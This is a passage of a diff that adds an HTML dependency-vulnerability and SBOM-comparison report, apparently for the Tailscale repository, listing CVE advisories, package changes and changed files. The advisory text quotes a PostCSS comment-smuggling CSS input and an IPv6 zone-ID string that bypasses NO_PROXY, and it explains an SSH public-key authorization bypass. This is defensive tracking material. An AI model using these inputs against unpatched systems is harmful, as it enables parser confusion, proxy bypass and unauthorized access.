class="vuln-link">https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</span><br><span class="vuln-link">https://github.com/vitejs/vite</span><br><br><div class="section-header">影响范围: </div><br>vite: &gt;= 6.2.0 &lt; 6.2.3 <br>vite: &gt;= 6.1.0 &lt; 6.1.2 <br>vite: &gt;= 6.0.0 &lt; 6.0.12 <br>vite: &gt;= 5.0.0 &lt; 5.4.15 <br>vite: 所有版本 &lt; 4.5.10 <br><br><br><div class="cve-header">来自 CVE-2025-30208 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-7fh5-64p2-3v2j</td>
+                            <td>An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\r` discrepancies, as demonstrated by `@font-face{ font:(\r/*);}` in a rule.<br><br>This vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2023-44270<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2023-44270</span><br><span class="vuln-link">https://github.com/github/advisory-database/issues/2820</span><br><span class="vuln-link">https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5</span><br><span class="vuln-link">https://github.com/postcss/postcss</span><br><span class="vuln-link">https://github.com/postcss/postcss/blob/main/lib/tokenize.js#L25</span><br><span class="vuln-link">https://github.com/postcss/postcss/releases/tag/8.4.31</span><br><br><div class="section-header">影响范围: </div><br>postcss: 所有版本 &lt; 8.4.31 <br><br><br><div class="cve-header">来自 CVE-2023-44270 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GO-2025-3488</td>
+                            <td>An attacker can pass a malicious malformed token which causes unexpected memory to be consumed during parsing.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2025-22868<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://go.dev/cl/652155</span><br><span class="vuln-link">https://go.dev/issue/71490</span><br><br><div class="section-header">影响范围: </div><br>golang.org/x/oauth2: 所有版本 &lt; 0.27.0 <br><br><br><div class="cve-header">来自 CVE-2025-22868 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GO-2024-2631 / GHSA-c5q2-7r4c-mv6g</td>
+                            <td>An attacker could send a JWE containing compressed data that used large amounts of memory and CPU when decompressed by Decrypt or DecryptMulti.<br><br><div class="section-header">相关漏洞ID: </div><br>CGA-9vf9-m4f8-6392<br>CGA-9vg5-h493-cxr7<br>CGA-chh8-vhg4-2qj7<br>CGA-g5hx-8r47-pf39<br>CGA-hmfp-f3v3-528v<br>CGA-hrqx-74pg-5m88<br>CGA-m474-c57g-8945<br>CGA-r356-23m2-5p37<br>CGA-v3wf-pwmr-vcw5<br>CGA-w52c-j6q8-cf23<br>CGA-w7jq-8v28-882j<br>CVE-2024-28180<br>GHSA-c5q2-7r4c-mv6g<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/go-jose/go-jose/security/advisories/GHSA-c5q2-7r4c-mv6g</span><br><span class="vuln-link">https://github.com/go-jose/go-jose/commit/0dd4dd541c665fb292d664f77604ba694726f298</span><br><span class="vuln-link">https://github.com/go-jose/go-jose/commit/add6a284ea0f844fd6628cba637be5451fe4b28a</span><br><span class="vuln-link">https://github.com/go-jose/go-jose/commit/f4c051a0653d78199a053892f7619ebf96339502</span><br><br><div class="section-header">影响范围: </div><br>github.com/go-jose/go-jose/v4: 所有版本 &lt; 4.0.1 <br>github.com/go-jose/go-jose/v3: 所有版本 &lt; 3.0.3 <br>gopkg.in/go-jose/go-jose.v2: 所有版本 &lt; 2.6.3 <br>gopkg.in/square/go-jose.v2: 所有版本 <br><br><br><div class="cve-header">来自 CVE-2024-28180 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GO-2024-3333</td>
+                            <td>An attacker can craft an input to the Parse functions that would be processed non-linearly with respect to its length, resulting in extremely slow parsing. This could cause a denial of service.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-45338<br>GHSA-w32m-9786-jp63<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://go.dev/cl/637536</span><br><span class="vuln-link">https://go.dev/issue/70906</span><br><span class="vuln-link">https://groups.google.com/g/golang-announce/c/wSCRmFnNmPA/m/Lvcd0mRMAwAJ</span><br><br><div class="section-header">影响范围: </div><br>golang.org/x/net: 所有版本 &lt; 0.33.0 <br><br><br><div class="cve-header">来自 CVE-2024-45338 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GO-2025-3503 / GHSA-qxp5-gwg8-xv66</td>
+                            <td>Matching of hosts against proxy patterns can improperly treat an IPv6 zone ID as a hostname component. For example, when the NO_PROXY environment variable is set to &amp;quot;*.example.com&amp;quot;, a request to &amp;quot;[::1%25.example.com]:80` will incorrectly match and not be proxied.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2025-22870<br>GHSA-qxp5-gwg8-xv66<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://go.dev/cl/654697</span><br><span class="vuln-link">https://go.dev/issue/71984</span><br><br><div class="section-header">影响范围: </div><br>golang.org/x/net: 所有版本 &lt; 0.36.0 <br><br><br><div class="cve-header">来自 CVE-2025-22870 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GO-2024-3321 / GHSA-v778-237x-gjrc</td>
+                            <td>Applications and libraries which misuse connection.serverAuthenticate (via callback field ServerConfig.PublicKeyCallback) may be susceptible to an authorization bypass.<br><br>The documentation for ServerConfig.PublicKeyCallback says that &amp;quot;A call to this function does not guarantee that the key offered is in fact used to authenticate.&amp;quot; Specifically, the SSH protocol allows clients to inquire about whether a public key is acceptable before proving control of the corresponding private key. PublicKeyCallback may be called with multiple keys, and the order in which the keys were provided cannot be used to infer which key the client successfully authenticated with, if any. Some applications, which store the key(s) passed to PublicKeyCallback (or derived information) and make security relevant determinations based on it once the connection is established, may make incorrect assumptions.<br><br>For example, an attacker may send public keys A and B, and then authenticate with A. PublicKeyCallback would be called only twice, first with A and then with B. A vulnerable application may then make authorization decisions based on key B for which the attacker does not actually control the private key.<br><br>Since this API is widely misused, as a partial mitigation golang.org/x/cry...@v0.31.0 enforces the property that, when successfully authenticating via public key, the last key passed to ServerConfig.PublicKeyCallback will be the key used to authenticate the connection. PublicKeyCallback will now be called multiple times with the same key, if necessary. Note that the client may still not control the last key passed to PublicKeyCallback if the connection is then authenticated with a different method, such as PasswordCallback, KeyboardInteractiveCallback, or NoClientAuth.<br><br>Users should be using the Extensions field of the Permissions return value from the various authentication callbacks to record data associated with the authentication attempt instead of referencing external state. Once the connection is established the state corresponding to the successful authentication attempt can be retrieved via the ServerConn.Permissions field. Note that some third-party libraries misuse the Permissions type by sharing it across authentication attempts; users of third-party libraries should refer to the relevant projects for guidance.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-45337<br>GHSA-v778-237x-gjrc<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/golang/crypto/commit/b4f1988a35dee11ec3e05d6bf3e90b695fbd8909</span><br><span class="vuln-link">https://go.dev/cl/635315</span><br><span class="vuln-link">https://go.dev/issue/70779</span><br><span class="vuln-link">https://groups.google.com/g/golang-announce/c/-nPEi39gI4Q/m/cGVPJCqdAQAJ</span><br><br><div class="section-header">影响范围: </div><br>golang.org/x/crypto: 所有版本 &lt; 0.31.0 <br><br><br><div class="cve-header">来自 CVE-2024-45337 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GO-2025-3487</td>
+                            <td>SSH servers which implement file transfer protocols are vulnerable to a denial of service attack from clients which complete the key exchange slowly, or not at all, causing pending content to be read into memory, but never transmitted.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2025-22869<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://go.dev/cl/652135</span><br><span class="vuln-link">https://go.dev/issue/71931</span><br><br><div class="section-header">影响范围: </div><br>golang.org/x/crypto: 所有版本 &lt; 0.35.0 <br><br><br><div class="cve-header">来自 CVE-2025-22869 的附加信息:</div></td>
+                        </tr>
+                        
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                
+            <button type="button" class="collapsible">
+                <span style="flex-grow: 1;">新增包 (6)</span>
+                <span style="font-size:14px;color:#666">点击展开/收起</span>
+            </button>
+            <div class="content">
+                <table>
+                    <tr>
+                        <th>包名</th>
+                        <th>版本</th>
+                        <th>许可证</th>
+                    </tr>
+                    <tr><td>github.com/tailscale/setec</td><td>v0.0.0-20250205144240-8898a29c3fbb</td><td>NOASSERTION</td></tr><tr><td>9fans.net/go</td><td>v0.0.8-0.20250307142834-96bdba94b63f</td><td>NOASSERTION</td></tr><tr><td>github.com/creachadair/taskgroup</td><td>v0.13.2</td><td>NOASSERTION</td></tr><tr><td>github.com/illarion/gonotify/v3</td><td>v3.0.2</td><td>NOASSERTION</td></tr><tr><td>github.com/Kodeworks/golang-image-ico</td><td>v0.0.0-20141118225523-73f0f4cfade9</td><td>NOASSERTION</td></tr><tr><td>github.com/go4org/plan9netshell</td><td>v0.0.0-20250324183649-788daa080737</td><td>NOASSERTION</td></tr>
+                </table>
+            </div>
+            
+                
+            <button type="button" class="collapsible">
+                <span style="flex-grow: 1;">移除包 (6)</span>
+                <span style="font-size:14px;color:#666">点击展开/收起</span>
+            </button>
+            <div class="content">
+                <table>
+                    <tr>
+                        <th>包名</th>
+                        <th>版本</th>
+                        <th>许可证</th>
+                    </tr>
+                    <tr><td>github.com/illarion/gonotify/v2</td><td>v2.0.3</td><td>NOASSERTION</td></tr><tr><td>github.com/dave/brenda</td><td>v1.1.0</td><td>NOASSERTION</td></tr><tr><td>github.com/bits-and-blooms/bitset</td><td>v1.13.0</td><td>NOASSERTION</td></tr><tr><td>github.com/dave/astrid</td><td>v0.0.0-20170323122508-8c2895878b14</td><td>NOASSERTION</td></tr><tr><td>github.com/dave/courtney</td><td>v0.4.0</td><td>NOASSERTION</td></tr><tr><td>github.com/dave/patsy</td><td>v0.0.0-20210517141501-957256f50cba</td><td>NOASSERTION</td></tr>
+                </table>
+            </div>
+            
+                
+            <button type="button" class="collapsible">
+                <span style="flex-grow: 1;">版本变更 (36)</span>
+                <span style="font-size:14px;color:#666">点击展开/收起</span>
+            </button>
+            <div class="content">
+                <table>
+                    <tr>
+                        <th>包名</th>
+                        <th>旧版本</th>
+                        <th>新版本</th>
+                        <th>变更类型</th>
+                    </tr>
+                    <tr><td>github.com/tailscale/wireguard-go</td><td>v0.0.0-20250107165329-0b8b35511f19</td><td>v0.0.0-20250304000100-91a0587fb251</td><td>一般变更</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/service/internal/checksum</td><td>v1.1.28</td><td>v1.5.5</td><td>次版本</td></tr><tr><td>golang.org/x/exp</td><td>v0.0.0-20250106191152-7588d65b2ba8</td><td>v0.0.0-20250210185358-939b2ce775ac</td><td>一般变更</td></tr><tr><td>github.com/inetaf/tcpproxy</td><td>v0.0.0-20250121183218-48c7e53d7ac4</td><td>v0.0.0-20250203165043-ded522cbd03f</td><td>一般变更</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/service/ssooidc</td><td>v1.21.7</td><td>v1.28.13</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/service/sso</td><td>v1.18.7</td><td>v1.24.14</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/service/internal/s3shared</td><td>v1.14.2</td><td>v1.18.12</td><td>次版本</td></tr><tr><td>github.com/gaissmai/bart</td><td>v0.11.1</td><td>v0.18.0</td><td>次版本</td></tr><tr><td>github.com/go-json-experiment/json</td><td>v0.0.0-20250103232110-6a9a0fde9288</td><td>v0.0.0-20250223041408-d3c622f1b874</td><td>一般变更</td></tr><tr><td>github.com/aws/aws-sdk-go-v2</td><td>v1.24.1</td><td>v1.36.0</td><td>次版本</td></tr><tr><td>gvisor.dev/gvisor</td><td>v0.0.0-20240722211153-64c016c92987</td><td>v0.0.0-20250205023644-9414b50a5633</td><td>一般变更</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/aws/protocol/eventstream</td><td>v1.4.10</td><td>v1.6.8</td><td>次版本</td></tr><tr><td>github.com/gokrazy/tools</td><td>v0.0.0-20240730192548-9f81add3a91e</td><td>v0.0.0-20250128200151-63160424957c</td><td>一般变更</td></tr><tr><td>github.com/u-root/u-root</td><td>v0.12.0</td><td>v0.14.0</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/feature/s3/manager</td><td>v1.11.64</td><td>v1.17.58</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/internal/v4a</td><td>v1.0.25</td><td>v1.3.31</td><td>次版本</td></tr><tr><td>fyne.io/systray</td><td>v1.11.0</td><td>v1.11.1-0.20250317195939-bcf6eed85e7a</td><td>补丁版本</td></tr><tr><td>golang.org/x/tools</td><td>v0.29.0</td><td>v0.30.0</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/service/internal/accept-encoding</td><td>v1.10.4</td><td>v1.12.2</td><td>次版本</td></tr><tr><td>golang.org/x/term</td><td>v0.28.0</td><td>v0.29.0</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/config</td><td>v1.26.5</td><td>v1.29.5</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/credentials</td><td>v1.16.16</td><td>v1.17.58</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/service/sts</td><td>v1.26.7</td><td>v1.33.13</td><td>次版本</td></tr><tr><td>golang.org/x/image</td><td>v0.23.0</td><td>v0.24.0</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/internal/endpoints/v2</td><td>v2.5.10</td><td>v2.6.31</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/internal/configsources</td><td>v1.2.10</td><td>v1.3.31</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/service/internal/presigned-url</td><td>v1.10.10</td><td>v1.12.12</td><td>次版本</td></tr><tr><td>golang.org/x/oauth2</td><td>v0.25.0</td><td>v0.26.0</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/feature/ec2/imds</td><td>v1.14.11</td><td>v1.16.27</td><td>次版本</td></tr><tr><td>github.com/tailscale/golang-x-crypto</td><td>v0.0.0-20240604161659-3fde5e568aa4</td><td>v0.0.0-20250218230618-9a281fd8faca</td><td>一般变更</td></tr><tr><td>github.com/tailscale/mkctr</td><td>v0.0.0-20250110151924-54977352e4a6</td><td>v0.0.0-20250228050937-c75ea1476830</td><td>一般变更</td></tr><tr><td>github.com/aws/smithy-go</td><td>v1.19.0</td><td>v1.22.2</td><td>次版本</td></tr><tr><td>golang.org/x/text</td><td>v0.21.0</td><td>v0.22.0</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/service/s3</td><td>v1.33.0</td><td>v1.75.3</td><td>次版本</td></tr><tr><td>github.com/aws/aws-sdk-go-v2/internal/ini</td><td>v1.7.2</td><td>v1.8.2</td><td>次版本</td></tr><tr><td>golang.org/x/time</td><td>v0.9.0</td><td>v0.10.0</td><td>次版本</td></tr>
+                </table>
+                
+            </div>
+            
+                
+                
+                
+                
+                
+                
+                    <button type="button" class="collapsible">
+                        <span style="flex-grow: 1;">版本变更引入的漏洞 (1)</span>
+                        <span style="font-size:14px;color:#666">点击展开/收起</span>
+                    </button>
+                    <div class="content">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>包名</th>
+                                    <th>漏洞ID</th>
+                                    <th>影响版本</th>
+                                    <th>描述</th>
+                                    <th>发布日期</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                
+                        <tr>
+                            <td>golang.org/x/oauth2</td>
+                            <td class="vuln-unknown">GO-2025-3488<br>关联CVE: CVE-2025-22868</td>
+                            <td>所有版本 &lt; 0.27.0</td>
+                            <td>Unexpected memory consumption during token parsing in golang.org/x/oauth2&lt;br&gt;&lt;br&gt;An attacker can pass a malicious malformed token which causes unexpected memory to be consumed during parsing.<div class='vuln-refs'><strong>参考链接:</strong><br><a href='https://go.dev/cl/652155' target='_blank' class='vuln-link'>https://go.dev/cl/652155</a><br><a href='https://go.dev/issue/71490' target='_blank' class='vuln-link'>https://go.dev/issue/71490</a></div></td>
+                            <td>2025-02-26</td>
+                        </tr>
+                        
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                
+            <h3>文件统计</h3>
+            <table>
+                <tr>
+                    <th>总文件数 (SBOM A)</th>
+                    <td>1668</td>
+                </tr>
+                <tr>
+                    <th>总文件数 (SBOM B)</th>
+                    <td>1775</td>
+                </tr>
+                <tr>
+                    <th>新增文件数</th>
+                    <td>110</td>
+                </tr>
+                <tr>
+                    <th>移除文件数</th>
+                    <td>3</td>
+                </tr>
+                <tr>
+                    <th>文件内容变更数</th>
+                    <td>282</td>
+                </tr>
+            </table>
+            
+                
+                <button type="button" class="collapsible">
+                    <span style="flex-grow: 1;">新增文件 (110)</span>
+                    <span style="font-size:14px;color:#666">点击展开/收起</span>
+                </button>
+                <div class="content">
+                    <p>(仅显示前100个，共110个)</p>
+                    <table>
+                        <tr>
+                            <th>文件名</th>
+                        </tr>
+                        <tr><td>tempfork\sshtest\ssh\testdata_test.go</td></tr><tr><td>tempfork\sshtest\ssh\session_test.go</td></tr><tr><td>tempfork\sshtest\ssh\server.go</td></tr><tr><td>util\eventbus\debug-demo\main.go</td></tr><tr><td>ipn\desktop\session.go</td></tr><tr><td>tempfork\sshtest\ssh\doc.go</td></tr><tr><td>tempfork\sshtest\ssh\ssh_gss.go</td></tr><tr><td>internal\client\tailscale\tailscale.go</td></tr><tr><td>util\eventbus\assets\event.html</td></tr><tr><td>tempfork\sshtest\ssh\channel.go</td></tr><tr><td>ipn\ipnauth\policy.go</td></tr><tr><td>tempfork\sshtest\ssh\certs_test.go</td></tr><tr><td>tempfork\sshtest\ssh\session.go</td></tr><tr><td>licenses\README.md</td></tr><tr><td>client\tailscale\tailscale_test.go</td></tr><tr><td>tempfork\sshtest\ssh\server_multi_auth_test.go</td></tr><tr><td>util\eventbus\assets\monitor.html</td></tr><tr><td>ipn\ipnlocal\desktop_sessions.go</td></tr><tr><td>tempfork\sshtest\ssh\cipher_test.go</td></tr><tr><td>tempfork\sshtest\ssh\mux_test.go</td></tr><tr><td>net\dns\direct_linux_test.go</td></tr><tr><td>util\eventbus\debughttp.go</td></tr><tr><td>tempfork\sshtest\ssh\client_auth_test.go</td></tr><tr><td>tempfork\sshtest\ssh\keys_test.go</td></tr><tr><td>tempfork\sshtest\ssh\cipher.go</td></tr><tr><td>ipn\auditlog\store.go</td></tr><tr><td>tempfork\sshtest\ssh\kex_test.go</td></tr><tr><td>ipn\ipnauth\self.go</td></tr><tr><td>cmd\containerboot\certs_test.go</td></tr><tr><td>portlist\portlist_plan9.go</td></tr><tr><td>cmd\natc\ipx_test.go</td></tr><tr><td>ipn\desktop\sessions_notwindows.go</td></tr><tr><td>net\udprelay\server.go</td></tr><tr><td>net\netmon\loghelper_test.go</td></tr><tr><td>tempfork\sshtest\ssh\transport_test.go</td></tr><tr><td>tstest\mts\mts.go</td></tr><tr><td>net\packet\geneve_test.go</td></tr><tr><td>ipn\auditlog\auditlog.go</td></tr><tr><td>tempfork\sshtest\ssh\handshake.go</td></tr><tr><td>tempfork\sshtest\ssh\buffer.go</td></tr><tr><td>tempfork\sshtest\ssh\connection.go</td></tr><tr><td>ipn\desktop\doc.go</td></tr><tr><td>tempfork\sshtest\ssh\messages.go</td></tr><tr><td>util\eventbus\bus.go</td></tr><tr><td>tempfork\sshtest\ssh\client_test.go</td></tr><tr><td>tempfork\sshtest\ssh\benchmark_test.go</td></tr><tr><td>tempfork\sshtest\ssh\common.go</td></tr><tr><td>ipn\ipnauth\actor_windows.go</td></tr><tr><td>cmd\natc\ipx.go</td></tr><tr><td>util\eventbus\client.go</td></tr><tr><td>tempfork\sshtest\ssh\streamlocal.go</td></tr><tr><td>ipn\desktop\sessions_windows.go</td></tr><tr><td>tempfork\sshtest\ssh\example_test.go</td></tr><tr><td>ipn\desktop\mksyscall.go</td></tr><tr><td>util\eventbus\fetch-htmx.go</td></tr><tr><td>tempfork\sshtest\ssh\keys.go</td></tr><tr><td>tempfork\sshtest\ssh\client_auth.go</td></tr><tr><td>tempfork\sshtest\ssh\mac.go</td></tr><tr><td>util\eventbus\bus_test.go</td></tr><tr><td>tempfork\sshtest\ssh\buffer_test.go</td></tr><tr><td>hostinfo\hostinfo_plan9.go</td></tr><tr><td>util\eventbus\bench_test.go</td></tr><tr><td>wgengine\router\router_plan9.go</td></tr><tr><td>ssh\tailssh\incubator_plan9.go</td></tr><tr><td>net\packet\geneve.go</td></tr><tr><td>tempfork\sshtest\ssh\mempipe_test.go</td></tr><tr><td>util\eventbus\doc.go</td></tr><tr><td>tempfork\sshtest\ssh\common_test.go</td></tr><tr><td>ipn\store\kubestore\store_kube_test.go</td></tr><tr><td>tempfork\sshtest\ssh\handshake_test.go</td></tr><tr><td>client\local\local.go</td></tr><tr><td>util\eventbus\subscribe.go</td></tr><tr><td>util\eventbus\debughttp_ios.go</td></tr><tr><td>net\dns\manager_plan9_test.go</td></tr><tr><td>net\dns\manager_plan9.go</td></tr><tr><td>.github\workflows\natlab-integrationtest.yml</td></tr><tr><td>tempfork\sshtest\README.md</td></tr><tr><td>wgengine\router\router_android.go</td></tr><tr><td>tempfork\sshtest\ssh\messages_test.go</td></tr><tr><td>tempfork\sshtest\ssh\transport.go</td></tr><tr><td>ipn\desktop\zsyscall_windows.go</td></tr><tr><td>cmd\containerboot\certs.go</td></tr><tr><td>tempfork\sshtest\ssh\server_test.go</td></tr><tr><td>tempfork\sshtest\ssh\tcpip_test.go</td></tr><tr><td>net\netmon\loghelper.go</td></tr><tr><td>maths\ewma_test.go</td></tr><tr><td>ipn\ipnauth\access.go</td></tr><tr><td>control\controlclient\errors.go</td></tr><tr><td>tempfork\sshtest\ssh\ssh_gss_test.go</td></tr><tr><td>util\eventbus\assets\style.css</td></tr><tr><td>ipn\desktop\sessions.go</td></tr><tr><td>safesocket\safesocket_darwin_test.go</td></tr><tr><td>ipn\auditlog\auditlog_test.go</td></tr><tr><td>tempfork\sshtest\ssh\client.go</td></tr><tr><td>net\udprelay\server_test.go</td></tr><tr><td>cmd\natc\natc_test.go</td></tr><tr><td>tempfork\sshtest\ssh\mux.go</td></tr><tr><td>maths\ewma.go</td></tr><tr><td>internal\client\tailscale\vip_service.go</td></tr><tr><td>tempfork\sshtest\ssh\tcpip.go</td></tr>
+                    </table>
+                </div>
+                
+                
+                <button type="button" class="collapsible">
+                    <span style="flex-grow: 1;">移除文件 (3)</span>
+                    <span style="font-size:14px;color:#666">点击展开/收起</span>
+                </button>
+                <div class="content">
+                    <p></p>
+                    <table>
+                        <tr>
+                            <th>文件名</th>
+                        </tr>
+                        <tr><td>ipn\store\awsstore\store_aws_stub.go</td></tr><tr><td>client\tailscale\localclient.go</td></tr><tr><td>client\tailscale\localclient_test.go</td></tr>
+                    </table>
+                </div>
+                
+                
+                <button type="button" class="collapsible">
+                    <span style="flex-grow: 1;">文件变更 (282)</span>
+                    <span style="font-size:14px;color:#666">点击展开/收起</span>
+                </button>
+                <div class="content">
+                    <table>
+                        <tr>
+                            <th>文件名</th>
+                            <th>变更类型</th>
+                        </tr>
+                        <tr><td>logpolicy\logpolicy.go</td><td>内容变更</td></tr><tr><td>ipn\prefs.go</td><td>内容变更</td></tr><tr><td>control\controlclient\direct.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\profiles.go</td><td>内容变更</td></tr><tr><td>ssh\tailssh\tailssh_test.go</td><td>内容变更</td></tr><tr><td>ipn\ipnauth\actor.go</td><td>内容变更</td></tr><tr><td>cmd\sniproxy\sniproxy.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\egress-services.go</td><td>内容变更</td></tr><tr><td>net\dns\direct_linux.go</td><td>内容变更</td></tr><tr><td>ipn\ipn_view.go</td><td>内容变更</td></tr><tr><td>client\tailscale\example\servetls\servetls.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\local_test.go</td><td>内容变更</td></tr><tr><td>ALPINE.txt</td><td>内容变更</td></tr><tr><td>words\scales.txt</td><td>内容变更</td></tr><tr><td>licenses\android.md</td><td>内容变更</td></tr><tr><td>disco\disco.go</td><td>内容变更</td></tr><tr><td>cmd\tailscale\cli\down.go</td><td>内容变更</td></tr><tr><td>kube\kubeclient\fake_client.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\c2n.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\ssh_stub.go</td><td>内容变更</td></tr><tr><td>types\prefs\prefs_example\prefs_types.go</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\server.go</td><td>内容变更</td></tr><tr><td>types\bools\bools.go</td><td>内容变更</td></tr><tr><td>cmd\testwrapper\testwrapper_test.go</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\wrap.go</td><td>内容变更</td></tr><tr><td>cmd\derper\cert_test.go</td><td>内容变更</td></tr><tr><td>net\tsdial\tsdial.go</td><td>内容变更</td></tr><tr><td>hostinfo\hostinfo.go</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\tcpip_test.go</td><td>内容变更</td></tr><tr><td>cmd\tailscale\cli\cli.go</td><td>内容变更</td></tr><tr><td>cmd\get-authkey\main.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\sts.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\ingress-for-pg.go</td><td>内容变更</td></tr><tr><td>tsweb\debug.go</td><td>内容变更</td></tr><tr><td>cmd\containerboot\serve.go</td><td>内容变更</td></tr><tr><td>cmd\tailscaled\ssh.go</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\agent.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\egress-pod-readiness.go</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\session_test.go</td><td>内容变更</td></tr><tr><td>ssh\tailssh\tailssh.go</td><td>内容变更</td></tr><tr><td>ipn\store\awsstore\store_aws_test.go</td><td>内容变更</td></tr><tr><td>cmd\tailscaled\tailscaled.go</td><td>内容变更</td></tr><tr><td>pkgdoc_test.go</td><td>内容变更</td></tr><tr><td>kube\kubeclient\client.go</td><td>内容变更</td></tr><tr><td>tailcfg\tailcfg_view.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\ssh.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\proxy.go</td><td>内容变更</td></tr><tr><td>types\opt\value_test.go</td><td>内容变更</td></tr><tr><td>net\routetable\routetable_linux.go</td><td>内容变更</td></tr><tr><td>logtail\logtail.go</td><td>内容变更</td></tr><tr><td>util\syspolicy\setting\summary.go</td><td>内容变更</td></tr><tr><td>cmd\tailscaled\deps_test.go</td><td>内容变更</td></tr><tr><td>client\tailscale\tailscale.go</td><td>内容变更</td></tr><tr><td>wgengine\netstack\link_endpoint.go</td><td>内容变更</td></tr><tr><td>tailcfg\derpmap.go</td><td>内容变更</td></tr><tr><td>net\netmon\interfaces_test.go</td><td>内容变更</td></tr><tr><td>cmd\tailscale\cli\ssh.go</td><td>内容变更</td></tr><tr><td>cmd\containerboot\tailscaled.go</td><td>内容变更</td></tr><tr><td>types\views\views_test.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\peerapi.go</td><td>内容变更</td></tr><tr><td>cmd\tailscaled\depaware.txt</td><td>内容变更</td></tr><tr><td>envknob\envknob.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\operator.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\operator_test.go</td><td>内容变更</td></tr><tr><td>ipn\ipnstate\ipnstate.go</td><td>内容变更</td></tr><tr><td>cmd\xdpderper\xdpderper.go</td><td>内容变更</td></tr><tr><td>tstest\integration\testcontrol\testcontrol.go</td><td>内容变更</td></tr><tr><td>cmd\derper\cert.go</td><td>内容变更</td></tr><tr><td>cmd\derper\derper_test.go</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\util.go</td><td>内容变更</td></tr><tr><td>wgengine\router\router_default.go</td><td>内容变更</td></tr><tr><td>wgengine\router\router_linux.go</td><td>内容变更</td></tr><tr><td>.github\workflows\govulncheck.yml</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\egress-pod-readiness_test.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\metrics_resources.go</td><td>内容变更</td></tr><tr><td>cmd\stund\stund.go</td><td>内容变更</td></tr><tr><td>tstest\integration\nat\nat_test.go</td><td>内容变更</td></tr><tr><td>util\syspolicy\setting\origin.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\tsrecorder.go</td><td>内容变更</td></tr><tr><td>cmd\derper\derper.go</td><td>内容变更</td></tr><tr><td>derp\derphttp\derphttp_client.go</td><td>内容变更</td></tr><tr><td>gokrazy\n